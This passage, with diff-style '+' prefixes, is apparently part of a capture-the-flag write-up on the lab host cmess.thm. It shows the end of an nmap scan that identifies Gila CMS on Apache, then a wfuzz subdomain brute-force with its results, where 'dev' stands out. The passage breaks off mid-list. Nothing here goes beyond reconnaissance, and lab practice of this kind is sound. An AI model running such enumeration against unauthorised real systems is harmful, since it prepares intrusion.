+| http-robots.txt: 3 disallowed entries 
+|_/src/ /themes/ /lib/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-generator: Gila CMS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.14 seconds
+
+┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
+└─$ wfuzz -u cmess.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cmess.thm" --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+ /home/witty/.local/lib/python3.11/site-packages/requests/__init__.py:89: RequestsDependencyWarning:urllib3 (1.26.15) or chardet (5.1.0) doesn't match a supported version!
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://cmess.thm/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload     
+=====================================================================
+
+000000019:   200        30 L     104 W      934 Ch      "dev"       
+000000014:   200        107 L    290 W      3898 Ch     "autoconfig"
+000000001:   200        107 L    290 W      3877 Ch     "www"       
+000000003:   200        107 L    290 W      3877 Ch     "ftp"       
+000000007:   200        107 L    290 W      3889 Ch     "webdisk"   
+000000016:   200        107 L    290 W      3880 Ch     "test"      
+000000018:   200        107 L    290 W      3880 Ch     "blog"      
+000000015:   200        107 L    290 W      3874 Ch     "ns"        
+000000017:   200        107 L    290 W      3871 Ch     "m"         
+000000020:   200        107 L    290 W      3880 Ch     "www2"      
+000000013:   200        107 L    290 W      3904 Ch     "autodiscove
+                                                        r"          
+000000005:   200        107 L    290 W      3889 Ch     "webmail"   
+000000009:   200        107 L    290 W      3886 Ch     "cpanel"    
+000000004:   200        107 L    290 W      3895 Ch     "localhost" 
+000000011:   200        107 L    290 W      3877 Ch     "ns1"       
+000000006:   200        107 L    290 W      3880 Ch     "smtp"      
+000000002:   200        107 L    290 W      3880 Ch     "mail"      
+000000012:   200        107 L    290 W      3877 Ch     "ns2"       
+000000008:   200        107 L    290 W      3877 Ch     "pop"       
+000000010:   200        107 L    290 W      3877 Ch     "whm"       
+000000021:   200        107 L    290 W      3877 Ch     "ns3"       
+000000024:   200        107 L    290 W      3883 Ch     "admin"     
+000000028:   200        107 L    290 W      3880 Ch     "imap"      
+000000031:   200        107 L    290 W      3886 Ch     "mobile"    
+000000027:   200        107 L    290 W      3874 Ch     "mx"        
+000000025:   200        107 L    290 W      3883 Ch     "mail2"     
+000000029:   200        107 L    290 W      3877 Ch     "old"       
+000000023:   200        107 L    290 W      3883 Ch     "forum"     
+000000022:   200        107 L    290 W      3880 Ch     "pop3"      
+000000026:   200        107 L    290 W      3877 Ch     "vpn"       
+000000035:   200        107 L    290 W      3874 Ch     "cp"        
+000000037:   200        107 L    290 W      3880 Ch     "shop"      
+000000032:   200        107 L    290 W      3883 Ch     "mysql"     
+000000043:   200        107 L    290 W      3883 Ch     "lists"     
+000000040:   200        107 L    290 W      3877 Ch     "ns4"       
+000000034:   200        107 L    290 W      3889 Ch     "support"   
+000000038:   200        107 L    290 W      3880 Ch     "demo"      
+000000033:   200        107 L    290 W      3880 Ch     "beta"      
+000000030:   200        107 L    290 W      3877 Ch     "new"       
+000000036:   200        107 L    290 W      3886 Ch     "secure"    
+000000044:   200        107 L    290 W      3877 Ch     "web"       
+000000059:   200        107 L    290 W      3895 Ch     "www.forum" 
+000000045:   200        107 L    290 W      3880 Ch     "www1"      
+000000060:   200        107 L    290 W      3892 Ch     "www.test"  
+000000039:   200        107 L    290 W      3880 Ch     "dns2"      
+000000047:   200        107 L    290 W      3880 Ch     "news"      
+000000058:   200        107 L    290 W      3892 Ch     "intranet"  
+000000042:   200        107 L    290 W      3886 Ch     "static"    
+000000051:   200        107 L    290 W      3877 Ch     "api"       
+000000041:   200        107 L    290 W      3880 Ch     "dns1"      
+000000056:   200        107 L    290 W      3877 Ch     "dns"       
+000000050:   200        107 L    290 W      3880 Ch     "wiki"      
+000000055:   200        107 L    290 W      3886 Ch     "backup"    
+000000048:   200        107 L    290 W      3886 Ch     "portal"    
